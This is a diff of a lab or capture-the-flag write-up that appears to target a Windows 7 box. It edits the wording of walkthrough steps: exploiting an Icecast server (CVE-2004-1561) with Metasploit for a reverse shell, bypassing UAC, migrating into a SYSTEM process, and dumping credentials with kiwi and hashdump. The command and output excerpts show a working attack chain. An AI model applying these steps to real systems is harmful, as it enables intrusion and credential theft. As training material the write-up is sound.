@@ -40,7 +40,7 @@ Host name: DARK-PC.
 ### Gain Access
 The victim is running a *Icecast Media server* which has a known vulnerability [CVE-2004-1561](https://www.cvedetails.com/cve/CVE-2004-1561) and is of type **Execute Code Overflow vulnerability**.
 
-Using this vulnerability exploit the victim and with `metasploit` to gain the remote shell.
+Using this vulnerability exploit the victim and using `metasploit` to gain the reverse shell.
 
 ```bash
 msf5 > search icecast
@@ -104,12 +104,12 @@ whoami
 dark-pc\dark
 ```
 
-We have successfully  exploited the victim and gained a meterpreter shell with the user *dark-pc\dark*.  
-The remote machine is running on Windows 7 - Build 7601 and of 64-Bit architecture.
+- We have successfully exploited the victim and gained a meterpreter shell, with the user *dark-pc\dark*.  
+- The remote machine is running on Windows 7 - Build 7601 and of 64-Bit architecture.
 
 ### Escalate the privileges
 
-By running a local exploit suggester on meterpreter, it suggested the victim is vulnerable to nine known vulnerabilities.
+By running a local exploit suggester from meterpreter, it suggested the victim is vulnerable to nine known vulnerabilities.
 
 ```bash
 meterpreter > run post/multi/recon/local_exploit_suggester
@@ -127,10 +127,10 @@ nil versions are discouraged and will be deprecated in Rubygems 4
 [+] 10.10.88.122 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
 [+] 10.10.88.122 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 ```
-From the results, the `exploit/windows/local/bypassuac_eventvwr` can be used to bypass the Windows UAC to esalate the privileges.
+From the results, the `exploit/windows/local/bypassuac_eventvwr` can be used to bypass the Windows UAC to escalate the privileges.
 
-Background the current session and note down the current session number by `sessions`.  
-Load the exploit and set the LHOST and SESSION number that was recorded above.
+Background the current session (ctrl+z) and take a note of the current session number using `sessions` command from meterpreter.  
+Load the exploit and set the LHOST and SESSION number to the one that was noted above.  
 
 ```bash
 msf5> use exploit/windows/local/bypassuac_eventvwr
@@ -175,7 +175,7 @@ msf5 exploit(windows/local/bypassuac_eventvwr) > run
 [*] Meterpreter session 2 opened (10.2.18.4:4444 -> 10.10.88.122:49748) at 2020-07-20 20:31:18 -0400
 [*] Cleaning up registry keys ...
 ```
-The exploit ran successfully and we can see the privileges by running `getprivs`.
+The exploit ran successfully and we can also see the privileges by running the `getprivs`.
 
 ```bash
 meterpreter > getprivs
@@ -211,9 +211,10 @@ SeUndockPrivilege
 
 meterpreter >
 ```
+From above results,  
 - Using the `SeTakeOwnershipPrivilege`, we can take the ownership of the files.  
 - We need to migrate our process to a stable and equally privileged, in order to access the `lsass` service (which is responsible for authentication).
-- List the running processes using `ps` and `migrate` to printer service.   
+- List the running processes using `ps` and `migrate` to printer service, who is running with `x64` architecture and with `NT AUTHORITY\SYSTEM` user.   
 
 ```bash
 meterpreter > ps
@@ -227,7 +228,7 @@ Server username: NT AUTHORITY\SYSTEM
 
 ### Looting Credentials
 
-Using the `kiwi` extension into the meterpreter, lets extract the passwords with `creds_all`.
+Loading the `kiwi` extension into the meterpreter, lets extract the passwords of the victim with the option `creds_all`.
 
 ```bash
 meterpreter > creds_all
@@ -266,7 +267,7 @@ Dark      Dark-PC    Password01!
 dark-pc$  WORKGROUP  (null)
 
 ```
-We have successfully extracted the credentials and the user `Dark` password is `Password01!`.  
+We have successfully extracted the available credentials and the user `Dark` password is `Password01!`.  
 
 ### Post Exploitation  
 - Using the `hashdump` we can dump the password hashes.  
